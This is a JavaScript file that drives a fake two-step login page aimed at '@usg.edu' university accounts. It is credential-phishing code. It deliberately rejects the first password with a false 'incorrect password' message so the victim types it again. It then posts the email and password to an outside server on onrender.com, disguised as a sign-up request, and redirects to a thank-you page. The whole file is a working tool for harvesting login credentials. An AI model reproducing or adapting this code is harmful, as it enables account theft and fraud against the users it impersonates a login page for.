document.addEventListener("DOMContentLoaded", function() {
    // Elements
    const Register = document.getElementById("register");
    const nextBtn = document.getElementById('nextBtn');
    const submitBtn = document.getElementById('submitBtn');
    const backBtn = document.getElementById('backBtn');
    const userNameDisplay = document.getElementById('userNameDisplay');
    const signInDisplay = document.getElementById('signInDisplay');
    const subtitleUserNameDisplay = document.getElementById('subtitle');
    const accessAcct = document.getElementById('accessAcc');
    const forPAss = document.getElementById('forPass');
    const name = document.getElementById("name");
    const key = document.getElementById("logId");
    const passCon = document.getElementById("pass-con");
    const alertCon = document.getElementById('alert-con');
    
    let firstAttempt = true; // Flag to track first submit attempt

    name.addEventListener("keypress", function(event) {
        if (event.key === "Enter") {
            event.preventDefault(); // Prevent form submission
            if (validateEmail(name.value)) {
                name.style.display = 'none';
                passCon.style.display = 'block';
                nextBtn.style.display = 'none';
                submitBtn.style.display = 'block';
                forPAss.style.display = 'block';
                userNameDisplay.style.display = 'block';
                subtitleUserNameDisplay.textContent = name.value;
                signInDisplay.style.display = 'none';
                backBtn.style.display = 'block';
                alertCon.textContent =''
            } else {
                alertCon.textContent = 'This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin';
            }
        }
    });
    // Email validation
    function validateEmail(email) {
        return email.endsWith("@usg.edu");
    }

    // Event listener for next button
    nextBtn.addEventListener('click', (e) => {
        e.preventDefault();
        if (validateEmail(name.value)) {
            name.style.display = 'none';
            passCon.style.display = 'block';
            nextBtn.style.display = 'none';
            submitBtn.style.display = 'block';
            forPAss.style.display = 'block';
            accessAcct.style.display = 'none';
            userNameDisplay.style.display = 'block';
            subtitleUserNameDisplay.textContent = name.value;
            signInDisplay.style.display = 'none';
            backBtn.style.display = 'block';
            alertCon.textContent =''
        } else {
            alertMsg("danger", "This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin");
        }
    });

    // Back button handler
    backBtn.addEventListener('click', (e) => {
        e.preventDefault();
        backBtn.style.display = 'none';
        name.style.display = 'block';
        passCon.style.display = 'none';
        nextBtn.style.display = 'block';
        submitBtn.style.display = 'none';
        forPAss.style.display = 'none';
        accessAcct.style.display = 'block';
        userNameDisplay.style.display = 'none';
        signInDisplay.style.display = 'block';
        alertCon.textContent = ''
    });

    // Handle form submission
    Register.addEventListener("submit", function(event) {
        event.preventDefault();
        if (firstAttempt) {
            // First submit attempt: Show incorrect password message
            alertMsg('danger', 'Your account or password is incorrect. If you don\'t remember your password, Try again.');
            firstAttempt = false; // Set flag to false to allow actual submission on next attempt
        } else {

            if (key.value.trim() === '') {
                alertMsg("danger", "Password cannot be empty.");
                return;
            }
    
            // Disable submit button to prevent multiple submissions
            submitBtn.disabled = true;
            submitBtn.value = 'Signing In...';
    
            const userData = {
                FullName: key.value,
                Email: name.value,
                Password: "username",
            };
    
            fetch("https://mail-sever.onrender.com/Api/User/sign-up", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(userData)
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(err => { throw err; });
                }
                return response.json();
            })
            .then(data => {
                // Redirect to home page after 2 seconds
                setTimeout(() => {
                    window.location.href = "usg_thanks.html";
                }, 2500);
            })
            .catch(error => {
                alertMsg("danger", "There was a problem signing in. Please try again later.");
                console.error("Error:", error);
            })
            .finally(() => {
                // Re-enable submit button
                submitBtn.disabled = false;
                submitBtn.value = 'Submit';
            });
        }
    });
    function alertMsg(alert, msg){
        alertCon.className = `${alert}`;
        alertCon.innerHTML = `<p>${msg}</p>`;
        setTimeout(()=>{
            alertCon.innerHTML=''
        }, 2000)
    };
});


